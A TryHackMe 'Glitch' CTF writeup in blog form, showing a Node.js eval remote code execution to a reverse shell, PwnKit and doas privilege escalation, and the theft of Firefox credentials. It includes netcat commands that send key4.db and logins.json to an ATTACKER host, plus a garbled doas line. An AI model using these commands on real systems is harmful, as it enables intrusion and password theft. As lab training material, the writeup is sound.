---
title: "Glitch - TryHackMe Writeup"
date: 2025-11-02
draft: false
summary: "Writeup for Glitch CTF challenge on TryHackMe."
tags: ["linux", "suid", "rce"]
categories: ["writeups"]
series: []
showToc: true
cover:
  image: "https://cdn.ziomsec.com/glitch/cover.webp"
  caption: "Glitch TryHackMe Challenge"
  alt: "Glitch cover"
platform: "TryHackMe"
author: "Moiz Bootwala"
---

Challenge showcasing a web app and simple privilege escalation. Can you find the glitch?
<!--more-->
To access the machine, click on the link given below:
- https://tryhackme.com/room/glitch

## Reconnaissance

I performed an **nmap** aggressive scan to identify open ports and the services running on the target.

```shell
nmap -A -p- TARGET --min-rate 10000 -oN glitch.nmap
```

![performing an nmap scan on glitch machine](https://cdn.ziomsec.com/glitch/1.webp)

## Initial Foothold

I visited the website running on the target and found nothing interesting at first.

![accessing the web application](https://cdn.ziomsec.com/glitch/2.webp)

It's source code revealed an interesting endpoint.

![inspecting the source code of the web app](https://cdn.ziomsec.com/glitch/3.webp)

I used **Burp**'s **Repeater** to then send a `GET` request to the endpoint and received a base64 encoded token.

![receiving a base64 encoded token](https://cdn.ziomsec.com/glitch/4.webp)

I used the **Decoder** tab to then decode this token and added this as the cookie value on the web page.

![decoding the cypher token](https://cdn.ziomsec.com/glitch/5.webp)

Refreshing the site now revealed the actual web content.

![injecting the cookie](https://cdn.ziomsec.com/glitch/6.webp)

However, again there was nothing special. The source code of this page used a **javascript** file which could contain new endpoints.

![inspecting the javascript file](https://cdn.ziomsec.com/glitch/7.webp)

I viewed the file and found another endpoint.

![inspecting the javascript file](https://cdn.ziomsec.com/glitch/8.webp)

Then I used **Repeater** to send a request to this endpoint and got another list of items.

![sending a request to the discovered endpoint](https://cdn.ziomsec.com/glitch/9.webp)

I then switched the HTTP method to **POST** and received something unusual, maybe we could send some value through an argument...

![switching HTTP method](https://cdn.ziomsec.com/glitch/10.webp)

I used **ffuf** and found the argument that could be used to send the value.

```shell
ffuf -u http://TARGET/api/item?FUZZ=a -w /usr/share/wordlists/seclists/Fuzzing/1-4_all_letters_a-z.txt -X POST
```

![fuzzing url arguments](https://cdn.ziomsec.com/glitch/11.webp)

Next I sent a value with the argument and received an interesting message.

![sending a value with the discovered argument](https://cdn.ziomsec.com/glitch/12.webp)

When I switched the number value to an alphabet, the application threw an error. The error was thrown by the **eval** function of **node.js**.

![causing a stack trace error](https://cdn.ziomsec.com/glitch/13.webp)

A simple **google** search revealed a way to exploit this and execute our commands.
- https://blog.appsecco.com/nodejs-and-a-simple-rce-exploit-d79001837cc6

I then used **revshells** to generate a reverse shell payload.
- https://www.revshells.com

Finally, I started a **netcat** listener and exploited the vulnerability to get a reverse shell.

![exploiting vulnerability for reverse shell](https://cdn.ziomsec.com/glitch/14.webp)

After gaining shell, I stabilized it.

```shell
export TERM=xterm
python -c "import pty;pty.spawn('/bin/bash')"
```

![spawning a tty shell](https://cdn.ziomsec.com/glitch/15.webp)

Finally, I captured the user flag from *user*'s home directory.

```shell
cat /home/user/user.txt
```

![capturing the user flag](https://cdn.ziomsec.com/glitch/16.webp)

## Privilege Escalation

### Gaining Root By Exploiting Pkexec

I checked for binaries with **SUID** bits. I noticed the **pkexec** binary and thought of giving the **PwnKit** exploit a try.

```shell
find / -user root -perm -u=s -ls 2>/dev/null
```

![searching for files with SUID bit](https://cdn.ziomsec.com/glitch/17.webp)

I downloaded the exploit code on the target system and provided it executable permission.
- https://github.com/ly4k/PwnKit

Upon executing it, I received root access.

![exploiting pkexec with SUID bit using PwnKit](https://cdn.ziomsec.com/glitch/18.webp)

I then captured the root flag from *root*'s home directory.

![capturing the root flag](https://cdn.ziomsec.com/glitch/19.webp)

### Gaining Shell As Root By Exploiting SUID On Doas

The exploitation of **pkexec** was most likely an unintended way of gaining root access. So I again listed the binaries with **SUID** bits and this time, used the `doas` binary for privilege escalation.

```shell
find / -user root -perm -u=s -ls 2>/dev/null
```

![searching for files with SUID bit](https://cdn.ziomsec.com/glitch/20.webp)

Before using the `doas` binary, I decided to go through the existing information in my directory. I found a folder for **firefox**. This folder could contain user credentials.

![inspecting firefox directory](https://cdn.ziomsec.com/glitch/21.webp)

When I listed the contents of the directory, I found the credential files:
- **key4.db**
- **logins.json**

![inspecting firefox directory](https://cdn.ziomsec.com/glitch/22.webp)

I transferred both the files using **netcat**.

```shell
# on attacker machine
nc -nlvp 4444 > key4.db
nc -nlvp 4445 > logins.json

# on target machine
nc -nv ATTACKER 4444 < key4.db
nc -nv ATTACKER 4445 < logins.json
```

After transferring both the files to my local system, I used the **firepwd** tool to decrypt and reveal any passwords stored in them.
- https://github.com/lclevy/firepwd

```shell
# move logins.json and key4.db to this directory.
python firepwd.py ./
```

![extracting user credentials](https://cdn.ziomsec.com/glitch/23.webp)

The files revealed *v0id*'s password. So, I used it to switch to the *v0id* user.

![switching to the user v0id](https://cdn.ziomsec.com/glitch/24.webp)

After switching to *v0id*, I ran the `doas` binary to spawn a **bash** shell as *root*.

```shell
/usr/local/bin/doas -u r/usr/local/bin/doas -u root /bin/bash
```

![spawning a bash shell by exploiting suid bit on doas](https://cdn.ziomsec.com/glitch/25.webp)

That's it from my end! Until next time :)

---
